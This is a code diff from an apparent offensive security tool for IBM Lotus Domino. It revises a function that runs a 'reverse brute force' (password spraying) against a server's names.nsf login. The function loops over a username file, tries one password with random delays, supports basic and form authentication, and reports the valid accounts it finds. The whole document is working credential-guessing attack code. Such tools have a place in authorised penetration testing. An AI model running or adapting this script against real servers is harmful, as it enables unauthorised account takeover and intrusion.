@@ -24,36 +24,17 @@ import time
 
 from domi_owned import utility
 
-requests.packages.urllib3.disable_warnings()
+try:
+	requests.packages.urllib3.disable_warnings()
+except:
+	pass
 
-# Get authentication type for names.nsf
-def get_auth_type(target, header, usernames, password):
-	names_url = "{0}/names.nsf".format(target)
-	request = requests.get(names_url, headers=header, timeout=3, allow_redirects=False, verify=False)
-
-	# Check for landing page
-	if request.status_code == 200:
-		post_regex = re.search('((?i)method=\'post\'|method=\"post\"|method=post)', request.text)
-		if post_regex:
-			auth_type = 'post'
-		else:
-			auth_type = 'get'
-
-	# No landing page, authentication uses get
-	elif request.status_code == 401:
-		auth_type = 'get'
-
-	# Assume authentication uses get
-	else:
-		utility.print_warn('Could not access names.nsf!')
-		auth_type = 'get'
-
-	reverse_bruteforce(target, header, usernames, password, auth_type)
-
-# Preform a reverse bruteforce against names.nsf
-def reverse_bruteforce(target, header, usernames, password, auth):
+# Preform a reverse brute force against names.nsf
+def reverse_bruteforce(target, usernames, password, auth):
 	username_list = []
 	valid_usernames = []
+
+	names_url = "{0}/names.nsf".format(target)
 
 	# Import usernames from file
 	username_file = open(usernames, 'r')
@@ -61,36 +42,32 @@ def reverse_bruteforce(target, header, usernames, password, auth):
 		username_list.append(username.rstrip())
 	username_file.close()
 
-	# Start reverse bruteforce
+	# Start reverse brute force
 	for username in username_list:
 		jitter = random.random()
 		time.sleep(jitter)
 		try:
-			if auth == 'get':
-				names_url = "{0}/names.nsf".format(target)
-				request = requests.get(names_url, headers=header, auth=(username, password), timeout=3, allow_redirects=False, verify=False)
+			if auth == 'basic':
+				access = utility.basic_auth(names_url, username, password)
+			elif auth == 'form':
+				access, session = utility.form_auth(names_url, username, password)
+			elif auth == 'open':
+				utility.print_good("{0} does not require authentication".format(names_url))
+				break
 			else:
-				names_url = "{0}/names.nsf?Login".format(target)
-				data = {'Username':username,
-					'Password':password,
-					'RedirectTo':names_url
-				}
-				request = requests.post(names_url, headers=header, data=data, timeout=3, verify=False)
+				utility.print_warn("Could not find {0}!".format(names_url))
+				break
 
-			# Handle 200 response
-			if request.status_code == 200:
-				notes_regex = re.compile('name=\'NotesView\'|name=\"NotesView\"|name=NotesView', re.I)
-				if notes_regex.match(request.text):
-					utility.print_good("Found valid account: {0}:{1}".format(username, password))
-					valid_usernames.append(username)
-				else:
-					pass
+			if access:
+				utility.print_good("Found valid account: {0}:{1}".format(username, password))
+				valid_usernames.append(username)
 			else:
 				pass
 
 		except KeyboardInterrupt:
 			break
-		except Exception:
+		except Exception as error:
+			utility.print_error("Error: {0}".format(error))
 			continue
 
 	# Print found usernames
